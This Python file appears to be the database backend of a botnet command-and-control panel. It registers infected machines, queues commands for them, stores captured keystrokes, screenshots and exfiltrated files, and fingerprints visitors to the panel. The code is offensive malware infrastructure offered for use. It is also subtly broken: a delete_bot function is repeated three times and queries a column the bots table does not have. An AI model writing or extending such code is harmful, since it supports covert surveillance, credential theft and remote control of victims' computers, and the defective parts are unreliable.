import sqlite3
import json
from datetime import datetime
from pathlib import Path

DB_PATH = Path(__file__).parent / "c2.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bots (id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os TEXT, ip TEXT, first_seen TEXT, last_seen TEXT, status TEXT DEFAULT 'online', capabilities TEXT, metadata TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, command TEXT, args TEXT, status TEXT DEFAULT 'pending', result TEXT, created_at TEXT, executed_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS panel_visits (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, user_agent TEXT, fingerprint TEXT, cookies TEXT, screen_resolution TEXT, timezone TEXT, language TEXT, visited_at TEXT, page TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, window_title TEXT, keystrokes TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, filename TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, filename TEXT, original_path TEXT, size INTEGER, timestamp TEXT)''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def register_bot(bot_id, hostname, username, os_info, ip, capabilities):
    conn = get_db()
    now = datetime.now().isoformat()
    conn.execute('INSERT OR REPLACE INTO bots (id, hostname, username, os, ip, first_seen, last_seen, capabilities) VALUES (?, ?, ?, ?, ?, ?, ?, ?)', (bot_id, hostname, username, os_info, ip, now, now, json.dumps(capabilities)))
    conn.commit()
    conn.close()

def update_bot_status(bot_id, status):
    conn = get_db()
    conn.execute("UPDATE bots SET status=?, last_seen=? WHERE id=?", (status, datetime.now().isoformat(), bot_id))
    conn.commit()
    conn.close()

def get_bots():
    conn = get_db()
    bots = conn.execute("SELECT * FROM bots ORDER BY last_seen DESC").fetchall()
    conn.close()
    return [dict(b) for b in bots]

def add_command(bot_id, command, args=None):
    conn = get_db()
    c = conn.execute('INSERT INTO commands (bot_id, command, args, created_at) VALUES (?, ?, ?, ?)', (bot_id, command, json.dumps(args) if args else None, datetime.now().isoformat()))
    cmd_id = c.lastrowid
    conn.commit()
    conn.close()
    return cmd_id

def get_pending_commands(bot_id):
    conn = get_db()
    cmds = conn.execute("SELECT * FROM commands WHERE bot_id=? AND status='pending' ORDER BY created_at", (bot_id,)).fetchall()
    conn.close()
    return [dict(c) for c in cmds]

def update_command_status(cmd_id, status, result=None):
    conn = get_db()
    conn.execute('UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?', (status, result, datetime.now().isoformat(), cmd_id))
    conn.commit()
    conn.close()

def get_commands(bot_id=None, limit=50):
    conn = get_db()
    if bot_id:
        cmds = conn.execute('SELECT * FROM commands WHERE bot_id=? ORDER BY created_at DESC LIMIT ?', (bot_id, limit)).fetchall()
    else:
        cmds = conn.execute('SELECT * FROM commands ORDER BY created_at DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return [dict(c) for c in cmds]

def log_panel_visit(ip, user_agent, fingerprint, cookies, screen_res, timezone, language, page):
    conn = get_db()
    conn.execute('INSERT INTO panel_visits (ip, user_agent, fingerprint, cookies, screen_resolution, timezone, language, visited_at, page) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', (ip, user_agent, fingerprint, cookies, screen_res, timezone, language, datetime.now().isoformat(), page))
    conn.commit()
    conn.close()

def get_panel_visits():
    conn = get_db()
    visits = conn.execute("SELECT * FROM panel_visits ORDER BY visited_at DESC LIMIT 100").fetchall()
    conn.close()
    return [dict(v) for v in visits]

def add_keylog(bot_id, window_title, keystrokes):
    conn = get_db()
    conn.execute('INSERT INTO keylogs (bot_id, window_title, keystrokes, timestamp) VALUES (?, ?, ?, ?)', (bot_id, window_title, keystrokes, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_keylogs(bot_id=None, limit=100):
    conn = get_db()
    if bot_id:
        logs = conn.execute('SELECT * FROM keylogs WHERE bot_id=? ORDER BY timestamp DESC LIMIT ?', (bot_id, limit)).fetchall()
    else:
        logs = conn.execute('SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return [dict(l) for l in logs]

def add_screenshot(bot_id, filename):
    conn = get_db()
    conn.execute('INSERT INTO screenshots (bot_id, filename, timestamp) VALUES (?, ?, ?)', (bot_id, filename, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_screenshots(bot_id=None):
    conn = get_db()
    if bot_id:
        ss = conn.execute('SELECT * FROM screenshots WHERE bot_id=? ORDER BY timestamp DESC', (bot_id,)).fetchall()
    else:
        ss = conn.execute('SELECT * FROM screenshots ORDER BY timestamp DESC').fetchall()
    conn.close()
    return [dict(s) for s in ss]

def add_file(bot_id, filename, original_path, size):
    conn = get_db()
    conn.execute('INSERT INTO files (bot_id, filename, original_path, size, timestamp) VALUES (?, ?, ?, ?, ?)', (bot_id, filename, original_path, size, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_files(bot_id=None):
    conn = get_db()
    if bot_id:
        files = conn.execute('SELECT * FROM files WHERE bot_id=? ORDER BY timestamp DESC', (bot_id,)).fetchall()
    else:
        files = conn.execute('SELECT * FROM files ORDER BY timestamp DESC').fetchall()
    conn.close()
    return [dict(f) for f in files]

def get_stats():
    conn = get_db()
    stats = {}
    stats['total_bots'] = conn.execute("SELECT COUNT(*) FROM bots").fetchone()[0]
    stats['online_bots'] = conn.execute("SELECT COUNT(*) FROM bots WHERE status='online'").fetchone()[0]
    stats['total_commands'] = conn.execute("SELECT COUNT(*) FROM commands").fetchone()[0]
    stats['pending_commands'] = conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
    stats['total_visits'] = conn.execute("SELECT COUNT(*) FROM panel_visits").fetchone()[0]
    stats['total_keylogs'] = conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
    stats['total_screenshots'] = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
    stats['total_files'] = conn.execute("SELECT COUNT(*) FROM files").fetchone()[0]
    conn.close()
    return stats

init_db()

def delete_bot(bot_id):
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM commands WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM keylogs WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM screenshots WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM files WHERE bot_id=?', (bot_id,))
    conn.commit()
    conn.close()

def delete_bot(bot_id):
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM commands WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM keylogs WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM screenshots WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM files WHERE bot_id=?', (bot_id,))
    conn.commit()
    conn.close()

def delete_bot(bot_id):
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM commands WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM keylogs WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM screenshots WHERE bot_id=?', (bot_id,))
    conn.execute('DELETE FROM files WHERE bot_id=?', (bot_id,))
    conn.commit()
    conn.close()
